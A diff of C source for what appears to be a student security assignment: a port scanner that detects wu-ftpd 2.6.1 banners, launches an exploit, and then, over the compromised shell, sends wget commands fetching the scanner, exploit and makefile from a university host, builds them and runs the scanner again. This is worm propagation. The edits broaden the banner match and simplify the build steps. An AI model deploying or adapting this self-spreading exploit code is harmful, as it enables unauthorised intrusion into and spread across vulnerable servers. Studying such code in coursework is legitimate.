@@ -206,7 +206,7 @@ int main(int argc, char *argv[]) {
                         printf("%s\t%d\t%s\n", ip, port, buffer);
                     }
 
-                    if (strstr(buffer,"FTP server (Version wu-2.6.1-18) ready.") != NULL) {
+                    if (strstr(buffer,"wu-2.6.1") != NULL) {
                         int argc = 4;
                         char *argv[4] = {
                             "exploiter",
@@ -286,9 +286,6 @@ void cshell (int sock) {
                                 "wget http://www.inf.ufpr.br/rdmgreca/CompSec/trab3/portscan.c\n",
                                 "wget http://www.inf.ufpr.br/rdmgreca/CompSec/trab3/exploit.c\n",
                                 "wget http://www.inf.ufpr.br/rdmgreca/CompSec/trab3/makefile\n",
-                                "gcc -c portscan.c\n",
-                                "gcc -c exploit.c\n",
-                                "gcc -o portscan portscan.o exploit.o\n",
                                 "make\n",
                                 "./portscan > portscan.out\n"
         };
@@ -298,9 +295,9 @@ void cshell (int sock) {
             printf("sending command '%s", commands[i]);
             write (sock, commands[i], strlen(commands[i]));
             sleep(10);
-            if ((i == 2) || (i == 7)) {
-                sleep(20);
-            }
+            // if ((i == 3) || (i == 7)) {
+            //     sleep(20);
+            // }
         }
         
 
